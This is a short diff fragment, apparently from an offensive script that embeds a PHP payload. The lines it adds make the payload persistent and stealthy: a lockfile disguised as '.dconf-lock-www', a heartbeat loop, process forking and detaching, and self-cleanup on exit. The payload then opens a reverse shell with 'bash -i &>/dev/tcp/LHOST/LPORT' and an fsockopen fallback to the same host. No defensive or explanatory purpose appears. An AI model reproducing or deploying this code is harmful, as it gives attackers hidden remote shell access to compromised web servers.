@@ -144,7 +144,23 @@ fi
 
 PHP_PAYLOAD=$(cat <<'PHPEOF'
 @ignore_user_abort(true);
-if(function_exists('pcntl_fork')){$p=pcntl_fork();if($p>0)return;posix_setsid();}
+$_lock='/var/tmp/.dconf-lock-www';
+if(file_exists($_lock)){
+  $age=time()-filemtime($_lock);
+  if($age<60)return;
+}
+file_put_contents($_lock,getmypid());
+if(function_exists('pcntl_fork')){
+  $p=pcntl_fork();
+  if($p>0){
+    // parent: run heartbeat then exit
+    while(file_exists($_lock)){touch($_lock);sleep(30);}
+    return;
+  }
+  posix_setsid();
+}
+// child (or non-fork fallback): spawn shell, then clean up lockfile
+register_shutdown_function(function()use($_lock){@unlink($_lock);});
 @shell_exec('bash -c \'exec bash -i &>/dev/tcp/LHOST/LPORT <&1\' 2>/dev/null &');
 if(!function_exists('fsockopen'))return;
 $s=@fsockopen('LHOST',LPORT);
